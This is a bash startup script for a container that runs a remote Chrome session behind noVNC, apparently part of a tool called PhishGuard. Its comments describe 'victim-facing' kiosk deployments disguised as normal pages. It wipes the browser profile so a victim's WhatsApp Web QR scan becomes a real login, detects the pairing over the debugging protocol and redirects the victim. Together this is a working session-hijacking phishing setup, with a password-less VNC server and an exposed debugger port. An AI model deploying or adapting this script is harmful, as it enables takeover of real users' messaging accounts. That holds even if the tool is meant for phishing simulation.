#!/bin/bash

# ── 1. Virtual framebuffer ────────────────────────────────────────────────────
echo "[1/4] Starting Xvfb..."
Xvfb :1 -screen 0 "${SCREEN_WIDTH}x${SCREEN_HEIGHT}x${SCREEN_DEPTH}" \
    -ac +extension GLX +render -noreset &

until [ -e /tmp/.X11-unix/X1 ]; do sleep 0.2; done
echo "[1/4] Xvfb ready."

# ── 2. VNC server ─────────────────────────────────────────────────────────────
# -shared allows the victim and admin links to view/control the same session
# simultaneously.
echo "[2/4] Starting x11vnc..."
x11vnc -display :1 -nopw -rfbport 5900 -forever -shared 2>&1 &
sleep 4
echo "[2/4] x11vnc started."

# ── 3. noVNC WebSocket proxy ──────────────────────────────────────────────────
echo "[3/4] Starting websockify..."
websockify --web /opt/novnc 0.0.0.0:6080 localhost:5900 &
sleep 2
echo "[3/4] websockify ready on :6080."

# ── 4. Chrome with Site Tweaker extension + CDP ───────────────────────────────
# Chrome 157 ignores --remote-debugging-address=0.0.0.0 and always binds the CDP
# port to 127.0.0.1, so other containers (the backend) can't reach it directly.
# We bind Chrome's CDP to loopback on 9223 and expose it to the Docker network on
# 9222 via a socat bridge (connections then arrive at Chrome from 127.0.0.1 and
# pass its loopback/Host checks).
echo "[4/4] Starting Chrome (CDP on 127.0.0.1:9223, bridged to 0.0.0.0:9222)..."

start_chrome() {
    # Clear any stale profile lock left by a previous (crashed) Chrome.
    rm -f /tmp/chrome-profile/SingletonLock /tmp/chrome-profile/SingletonCookie 2>/dev/null

    # Victim-facing deploys run in kiosk mode: full-screen, no tab strip and no
    # address bar, so it looks like a normal page. The creation preview leaves
    # KIOSK unset so the operator keeps Chrome's UI + the Site Tweaker toolbar.
    KIOSK_FLAG=""
    if [ -n "${KIOSK}" ]; then KIOSK_FLAG="--kiosk"; fi

    google-chrome \
        --no-sandbox \
        --disable-dev-shm-usage \
        --disable-gpu \
        --load-extension=/extensions/site-tweaker \
        --remote-debugging-port=9223 \
        --remote-debugging-address=127.0.0.1 \
        --user-data-dir=/tmp/chrome-profile \
        --window-size="${SCREEN_WIDTH},${SCREEN_HEIGHT}" \
        --start-maximized \
        ${KIOSK_FLAG} \
        --no-first-run \
        --no-default-browser-check \
        --disable-sync \
        --disable-fre \
        --disable-features=ChromeWhatsNewUI,SigninIntercept,SignInPromo,PrivacySandboxSettings4,SyncConsentOptional \
        --disable-infobars \
        "${START_URL:-about:blank}" 2>&1
}

# Start from a clean browser profile on every container start, so sites like
# WhatsApp Web show a fresh QR (logged out) and a scan is a real login. Done
# once here (not in the respawn loop, which must keep the session during a run).
# Site modifications are re-applied from seed.json on load, so they don't need
# a persisted profile.
rm -rf /tmp/chrome-profile 2>/dev/null
mkdir -p /tmp/chrome-profile

# Keep Chrome alive: if it ever exits (e.g. the last tab is closed), respawn it
# so the "Browser" session is always running and ready to navigate.
( while true; do
    echo "[chrome] launching..."
    start_chrome
    echo "[chrome] exited — respawning in 2s"
    sleep 2
done ) &

# CDP bridge: expose Chrome's loopback debugger to the Docker network.
socat TCP-LISTEN:9222,fork,reuseaddr TCP:127.0.0.1:9223 &

# Early scan detection: watch WebSocket pairing traffic over CDP and publish the
# redirect the instant a scan's pairing starts (before "loading your messages").
# Only acts on "scan" campaigns; restarts if it ever exits.
( while true; do python3 /ws-monitor.py; sleep 2; done ) &

# ── Redirect signal relay ─────────────────────────────────────────────────────
# The campaign's extension sets the page title to "PHISHGUARD_REDIRECT::<url>"
# when its trigger fires. This watcher reads the title over CDP and publishes the
# URL two ways for the noVNC viewer (pgvnc.html): a static file served by
# websockify (same-origin, reliable — the primary path) and the X CLIPBOARD.
rm -f /opt/novnc/pg-redirect.txt
( last=""
  while true; do
    sig=$(curl -s -H "Host: localhost" http://127.0.0.1:9223/json 2>/dev/null \
          | grep -o 'PHISHGUARD_REDIRECT::[^"]*' | head -1)
    if [ -n "$sig" ] && [ "$sig" != "$last" ]; then
        url=${sig#PHISHGUARD_REDIRECT::}
        printf '%s' "$url" > /opt/novnc/pg-redirect.txt
        printf '%s' "$sig" | DISPLAY=:1 xclip -selection clipboard 2>/dev/null
        last="$sig"
    fi
    sleep 0.15
  done ) &

echo "========================================"
echo "PhishGuard noVNC ready"
echo "  VNC viewer → http://localhost:6080/vnc_lite.html"
echo "  CDP        → http://localhost:9222  (bridged → 127.0.0.1:9223)"
echo "========================================"

wait
